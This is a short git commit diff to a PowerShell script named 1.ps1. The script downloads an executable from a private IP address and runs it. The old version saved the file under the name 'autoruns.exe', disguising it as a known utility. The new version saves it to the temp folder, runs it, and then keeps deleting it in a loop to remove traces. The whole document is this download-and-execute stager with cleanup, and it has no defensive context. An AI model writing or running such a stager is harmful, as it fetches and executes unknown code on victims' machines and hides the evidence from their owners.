4b00524f731d943e84c619c344a058e75a99140d
Xre0uS <hello@xre0us.io>
2025-03-23 17:15:28 +0800

    Update 1.ps1

--- final/1.ps1
+++ final/1.ps1
@@ -1,1 +1,6 @@
-Invoke-WebRequest -Uri 'http://192.168.0.10/0.exe' -OutFile autoruns.exe; .\autoruns.exe
+Invoke-WebRequest -Uri 'http://192.168.0.10/0.exe' -OutFile $env:temp\0.exe; & "$env:temp\0.exe"
+
+while(Test-Path "$env:temp\0.exe"){
+Remove-Item "$env:temp\0.exe"
+Start-Sleep 3
+}
